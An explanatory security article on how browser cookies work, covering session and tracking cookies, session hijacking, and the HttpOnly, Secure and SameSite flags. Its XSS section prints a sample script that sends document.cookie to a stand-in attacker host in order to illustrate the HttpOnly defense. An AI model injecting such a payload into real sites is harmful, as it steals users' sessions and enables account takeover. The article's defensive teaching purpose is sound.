Browser Cookies Explained: What They Do, How They Work, and How Attackers Abuse Them

Every time you log into a website, add something to a shopping cart, or see a personalized ad, a tiny text file called a browser cookie is working behind the scenes. They're one of the most fundamental technologies on the web — and also one of the most abused.

🍪 What a Browser Cookie Actually Is

A browser cookie (also called an HTTP cookie) is a small piece of data — typically a few bytes to a few kilobytes — that a web server sends to your browser and your browser stores locally. Cookies are plain text files containing key-value pairs.

A typical cookie looks like this internally:

Cookie Structure:

session_id=abc123xyz789; Domain=.example.com; Path=/; Expires=Tue, 17 Jul 2027 12:00:00 UTC; Secure; HttpOnly; SameSite=Lax

Each cookie contains:

  • Name and Value: The actual data, like session_id=abc123.
  • Domain: Which website the cookie belongs to.
  • Path: Which URL paths the cookie applies to.
  • Expiration: When the cookie should be deleted.
  • Flags: Security attributes like Secure, HttpOnly, and SameSite.

🌐 How a Website Creates and Stores One

The process begins when your browser makes a request to a web server.

Step 1: You visit https://example.com. Your browser sends a request to the server.

Step 2: The server responds with the webpage and includes a Set-Cookie header in the HTTP response:

Server Response Header:

HTTP/2 200 OK
Content-Type: text/html
Set-Cookie: session_id=abc123xyz789; Path=/; HttpOnly; Secure; SameSite=Lax

Step 3: Your browser reads the Set-Cookie header and stores the cookie in its cookie jar — a local database (usually an SQLite file) managed by the browser.

Step 4: The cookie now lives on your machine until it expires, gets deleted, or the browser clears it.

🔁 How Cookies Are Sent Back to Websites

The magic of cookies is that the browser handles them automatically.

Every subsequent request to the same domain that matches the cookie's path and domain attributes automatically includes the cookie in the Cookie request header:

Browser Request Header:

GET /dashboard HTTP/2
Host: example.com
Cookie: session_id=abc123xyz789

The server reads this header, looks up the session ID in its database, and knows it's you. No login prompt needed on every page.

The browser only sends cookies back to the domain that set them. This is called the same-origin policy — and it's the foundation of cookie security. When this policy is broken, vulnerabilities happen.

🔐 Session Cookies and Login Sessions

Session cookies are the most common type. They're what keeps you logged in as you navigate a website.

How it works:

  • You enter your username and password on a login form.
  • The server verifies your credentials and creates a session — a record stored server-side that says "this user is authenticated."
  • The server sends a session ID cookie to your browser.
  • Every subsequent request includes that session ID. The server checks it, sees you're authenticated, and serves the protected content.

Session cookies can be:

  • Non-persistent (session-only): Deleted when you close the browser. No Expires or Max-Age attribute is set.
  • Persistent: Survive browser restarts. Have an Expires or Max-Age attribute. Often used for "Remember Me" features.

📊 Tracking and Advertising Cookies

Not all cookies are for login. Third-party cookies changed the web forever — and not entirely for the better.

How tracking works:

  • A website loads an ad or analytics script from ad-tracker.com.
  • That third-party server drops a cookie with a unique identifier in your browser.
  • You visit another site that also loads content from ad-tracker.com.
  • The browser sends the same cookie to ad-tracker.com.
  • The tracker now knows you visited both Site A and Site B — and builds a profile of your browsing habits.

This is how you see ads for products you searched for on completely different websites. It's why privacy regulations (GDPR, CCPA) now require cookie consent banners, and why modern browsers are phasing out third-party cookies entirely.

⚠️ What Happens When Cookies Are Stolen

A stolen cookie is essentially a stolen identity — at least temporarily. If an attacker obtains your session cookie, they can impersonate you without ever knowing your password.

The attacker simply:

  • Copies your session cookie value.
  • Sets it in their own browser (using developer tools or a browser extension).
  • Visits the same website.
  • The server sees the valid session ID and grants them full access to your account.

They can read your emails, change your password, make purchases, or exfiltrate sensitive data — all while the website believes it's you.

🕵️ Session Hijacking

Session hijacking (also called cookie hijacking or session sidejacking) is the act of stealing someone's session cookie and using it to gain unauthorized access.

Common methods attackers use:

  • Packet sniffing on unencrypted networks: On open Wi-Fi (coffee shops, airports), if the website uses HTTP instead of HTTPS, cookies are sent in plaintext. Anyone on the same network can capture them using tools like Wireshark.
  • Malware: A trojan or stealer on the victim's machine can extract cookies from the browser's cookie database.
  • Cross-Site Scripting (XSS): The most common technical method — covered in detail below.
  • Session fixation: The attacker forces the victim to use a known session ID, then waits for them to log in.
Real-World Example:

In 2015, the MobileIron session hijacking vulnerability (CVE-2015-7398) allowed attackers to steal session cookies from mobile device management consoles, granting full admin access to corporate devices.

🧪 XSS and Cookie Theft

Cross-Site Scripting (XSS) is the most well-known technique for stealing cookies. If a website has an XSS vulnerability, an attacker can inject a script that reads document.cookie and sends it to their server.

The attack:

Attacker's Payload:

<script>
  fetch('https://attacker.example.com/steal?cookie=' + document.cookie);
</script>

When a victim views a page containing this payload (in a comment, a profile field, or a reflected search parameter), the script executes in their browser. It reads all cookies accessible to JavaScript and sends them to the attacker's server.

Why this works: By default, JavaScript running on the same origin can access document.cookie — the entire cookie jar for that domain. The only defense against this is the HttpOnly flag.

🛡️ HttpOnly, Secure, and SameSite

These three cookie flags are the most important defenses against cookie theft. Every web developer and pentester should understand them inside out.

🔒 HttpOnly

What it does: Prevents JavaScript from accessing the cookie via document.cookie.

  • Without HttpOnly: document.cookie returns the cookie. XSS can steal it.
  • With HttpOnly: document.cookie returns nothing for that cookie. XSS cannot read it.
  • The cookie is still sent automatically with HTTP requests — normal browser behavior is unaffected.
Setting HttpOnly:

Set-Cookie: session_id=abc123; HttpOnly

Important limitation: HttpOnly protects against cookie reading via XSS, but not against request forgery (CSRF). It also doesn't protect against malware that reads the browser's cookie database directly.

🔒 Secure

What it does: Tells the browser to only send the cookie over HTTPS connections.

  • If a page is loaded over HTTP (even on an otherwise HTTPS site), the cookie is not sent.
  • This prevents man-in-the-middle attacks where an attacker on the same network captures the cookie from an unencrypted connection.
Setting Secure:

Set-Cookie: session_id=abc123; Secure

🔒 SameSite

What it does: Controls when the cookie is sent in cross-site requests. This is the most modern defense and prevents CSRF attacks along with some forms of cookie leakage.

  • SameSite=Strict: Cookie is only sent if the request originates from the same site. Most secure, but can break legitimate cross-site navigation (like clicking a link from an email).
  • SameSite=Lax (default in modern browsers): Cookie is sent for top-level navigations (clicking a link) but not for embedded requests (images, iframes, scripts loaded from other sites). Good balance of security and usability.
  • SameSite=None: Cookie is sent for all cross-site requests. Requires Secure flag. Used for third-party integrations but opens more attack surface.
Setting SameSite:

Set-Cookie: session_id=abc123; SameSite=Strict
Set-Cookie: session_id=abc123; SameSite=Lax
Set-Cookie: session_id=abc123; SameSite=None; Secure

The Ideal Session Cookie

Maximum Security Configuration:

Set-Cookie: session_id=abc123xyz789; Path=/; Expires=...; HttpOnly; Secure; SameSite=Strict

🧹 Clearing Cookies and Managing Permissions

As both a user and a security professional, knowing how to manage cookies is essential.

For Users (General Advice)

  • Clear cookies regularly: Especially after using public or shared computers. Old session cookies can sit around for months.
  • Use browser privacy modes: Incognito/Private mode creates a temporary cookie jar that's wiped when you close the window.
  • Review site permissions: Modern browsers let you see which sites have stored cookies and delete them individually.
  • Use cookie blockers: Browser extensions or built-in settings can block third-party cookies entirely.

For Developers and Pentesters

  • Developer Tools (Application tab): In Chrome/Edge DevTools, the Application tab shows every cookie stored by the current site. You can view, edit, and delete cookies here — essential for testing session handling.
  • Manual testing: Delete a session cookie and see if the application properly redirects you to login or exposes an error. This tests for proper session termination.
  • Cookie manipulation: Modify cookie values in DevTools to test for improper validation. Change a session ID and see if the server catches it.
Clearing Cookies in Chrome:

Settings → Privacy and Security → Clear Browsing Data →
Check "Cookies and other site data" → Clear Data

Or via DevTools:

F12 → Application → Cookies → [site] → Right-click → Clear

How To Protect Yourself

  • Use HTTPS everywhere: Ensure websites you visit use HTTPS. Browser extensions like HTTPS Everywhere can help enforce this.
  • Log out after sessions: Especially on shared or public computers. Logging out properly destroys the session on the server side.
  • Be cautious on public Wi-Fi: Use a VPN to encrypt all traffic if you must use open networks.
  • Keep browsers updated: Modern browsers include increasingly sophisticated cookie protections (SameSite defaults, partitioned storage).
  • Review cookie permissions: Periodically clear cookies you don't need and review which sites have stored data.
  • Developers: Always set HttpOnly + Secure + SameSite on session cookies. There is almost never a reason not to.

Final Thoughts

Cookies are one of those technologies that seem simple on the surface — a small text file, what could go wrong? But they're the backbone of web authentication, session management, and personalization. They're also one of the most targeted attack surfaces on the web.

Understanding how cookies work, how they're created, how they're transmitted, and how they can be stolen is essential knowledge for any web developer, security professional, or even everyday internet user.

The key takeaways: Use HTTPS. Set HttpOnly, Secure, and SameSite on every session cookie. Sanitize user input to prevent XSS. And never assume a cookie is safe just because it's stored in your browser.

Stay informed. Stay secure. Stay protected.
